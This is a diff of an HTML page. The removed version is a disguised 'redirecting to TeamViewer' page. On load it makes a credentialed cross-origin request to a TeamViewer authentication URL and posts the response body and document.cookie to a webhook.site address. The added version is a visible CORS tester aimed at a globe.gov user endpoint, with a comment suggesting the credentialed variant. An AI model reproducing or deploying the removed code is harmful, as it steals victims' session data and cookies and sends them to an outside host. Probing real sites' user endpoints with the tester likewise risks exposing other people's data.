@@ -1,40 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Checking Session Status...</title>
+    <meta charset="UTF-8">
+    <title>CORS Vulnerability Tester</title>
 </head>
 <body>
+    <h2>CORS Information Disclosure Tester</h2>
+    <button onclick="testCorsEndpoint()">Test Endpoint</button>
+    <pre id="output" style="background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
+
     <script>
-        async function runExploit() {
-            const target = "https://web.teamviewer.com/authenticate/withtoken?username=seventhholic@gmail.com";
-            const webhook = "https://webhook.site/975f12c3-4971-4843-804f-df3891ee3a4f";
+        function testCorsEndpoint() {
+            const targetUrl = "https://www.globe.gov/o/users-orgs-admin/v1.0/users/186079865";
+            const outputDiv = document.getElementById("output");
 
-            try {
-                // This simulates the cross-origin request
-                const response = await fetch(target, {
-                    method: 'GET',
-                    credentials: 'include' // This is the key to sending/receiving cookies
+            // We use credentials: 'include' to check if the browser sends cookies with the cross-origin request
+            fetch(targetUrl, {
+                method: "GET",
+                mode: "cors",
+                credentials: "omit", // First test without cookies, then try "include"
+                headers: {
+                    "Accept": "application/json"
+                }
+            })
+            .then(response => {
+                let headersObj = {};
+                response.headers.forEach((value, key) => {
+                    headersObj[key] = value;
                 });
 
-                const body = await response.text();
-
-                // Send whatever we found to your webhook
-                await fetch(webhook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        status: "Success",
-                        data_captured: body,
-                        js_cookies: document.cookie // Stolen if not HttpOnly
-                    })
-                });
-            } catch (e) {
-                // If it fails, let's log WHY it failed (usually CORS block)
-                await fetch(webhook + "?error=" + btoa(e.message));
-            }
+                if (response.ok) {
+                    return response.json().then(data => ({
+                        status: response.status,
+                        headers: headersObj,
+                        body: data
+                    }));
+                } else {
+                    return response.text().then(text => ({
+                        status: response.status,
+                        headers: headersObj,
+                        body: text
+                    }));
+                }
+            })
+            .then(result => {
+                outputDiv.innerText = JSON.stringify(result, null, 2);
+            })
+            .catch(error => {
+                outputDiv.innerText = "Error: " + error.toString();
+            });
         }
-        runExploit();
     </script>
-    <h2>Please wait, redirecting to TeamViewer...</h2>
 </body>
 </html>
